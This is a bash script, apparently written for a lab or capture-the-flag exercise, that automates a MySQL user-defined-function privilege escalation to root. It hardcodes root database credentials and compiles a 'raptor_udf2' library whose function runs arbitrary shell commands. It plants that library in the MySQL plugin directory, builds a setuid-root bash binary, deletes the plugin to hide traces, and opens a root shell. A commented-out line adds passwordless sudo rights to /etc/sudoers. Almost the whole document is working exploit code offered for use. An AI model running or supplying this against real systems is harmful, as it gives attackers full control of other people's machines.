#! /bin/bash

## Credentials and Database details

export DATABASE="ch16"

cat > /tmp/my.cnf << EOF
[client]
user=root
password=root@ISIntS
EOF

chmod 0700 /tmp/my.cnf

## Creating raptor_udf2.c file on /tmp/
cat > /tmp/raptor_udf2.c << EOF
#include <stdio.h>
#include <stdlib.h>

enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};

typedef struct st_udf_args {
        unsigned int arg_count; // number of arguments
        enum Item_result *arg_type; // pointer to item_result
        char **args; // pointer to arguments
        unsigned long *lengths; // length of string args
        char *maybe_null; // 1 for maybe_null args
} UDF_ARGS;

typedef struct st_udf_init {
        char maybe_null; // 1 if func can return NULL
        unsigned int decimals; // for real functions
        unsigned long max_length; // for string functions
        char *ptr; // free ptr for func data
        char const_item; // 0 if result is constant
} UDF_INIT;

int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
        if (args->arg_count != 1)
                return(0);
        system(args->args[0]);
        return(0);
}

char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
        return(0);
}
EOF

## Creating setuid.c file on /tmp/
cat > /tmp/setuid.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

int main(void)
{
        setuid(0);
        setgid(0);
        system("/bin/bash");
}
EOF

## Compiling raptor_udf2.c
gcc -g -fPIC -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

## Exploiting and getting root shell
##
## -- CREATE TABLE MySQLPrvSc(line blob);
## -- INSERT INTO MySQLPrvSc values(LOAD_FILE('/tmp/raptor_udf2.so'));
## 
mysql --defaults-extra-file=/tmp/my.cnf --database=$DATABASE -e "CREATE TABLE MySQLPrvSc(line blob)" 2>&1
mysql --defaults-extra-file=/tmp/my.cnf --database=$DATABASE -e "INSERT INTO MySQLPrvSc values(LOAD_FILE('/tmp/raptor_udf2.so'))" 2>&1
##
## -- SELECT @@GLOBAL.plugin_dir;
## -- SELECT line FROM MySQLPrvSc INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
##
mysql --defaults-extra-file=/tmp/my.cnf --database=$DATABASE -e "SET @raptor_query = CONCAT('SELECT line FROM MySQLPrvSc INTO DUMPFILE ', 0x27, @@GLOBAL.plugin_dir, 0x2F,'raptor_udf2.so', 0x27); PREPARE raptor FROM @raptor_query; EXECUTE raptor; DEALLOCATE PREPARE raptor" 2>&1
mysql --defaults-extra-file=/tmp/my.cnf --database=$DATABASE -e "DROP TABLE IF EXISTS MySQLPrvSc"
##
## -- CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
##
mysql --defaults-extra-file=/tmp/my.cnf -e "CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so'" 2>&1
##
## -- SELECT do_system('gcc -o /tmp/setuid /tmp/setuid.c');
##
mysql --defaults-extra-file=/tmp/my.cnf -e "SELECT do_system(\"gcc -o /tmp/setuid /tmp/setuid.c\")" 2>&1 >/dev/null
##
## -- SELECT do_system('chmod u+s /tmp/setuid');
##
mysql --defaults-extra-file=/tmp/my.cnf -e "SELECT do_system(\"chmod u+s /tmp/setuid\")" 2>&1 >/dev/null
## Need to fix the below line in a better way to use something like -- rm (SELECT CONCAT(@@GLOBAL.plugin_dir, 'raptor_udf2.so'))
mysql --defaults-extra-file=/tmp/my.cnf -e "SELECT do_system(\"rm /usr/lib*/mysql/plugin/raptor_udf2.so\")"  2>&1 >/dev/null
## mysql --defaults-extra-file=/tmp/my.cnf -e "SELECT do_system(\"echo \"`whoami` ALL =(ALL) NOPASSWD: ALL\" >> /etc/sudoers\") 2>&1 >/dev/null
mysql --defaults-extra-file=/tmp/my.cnf -e "DROP FUNCTION IF EXISTS do_system;"
mysql --defaults-extra-file=/tmp/my.cnf -e "\!sh /tmp/setuid"
##
## -- \!sh /tmp/setuid
##
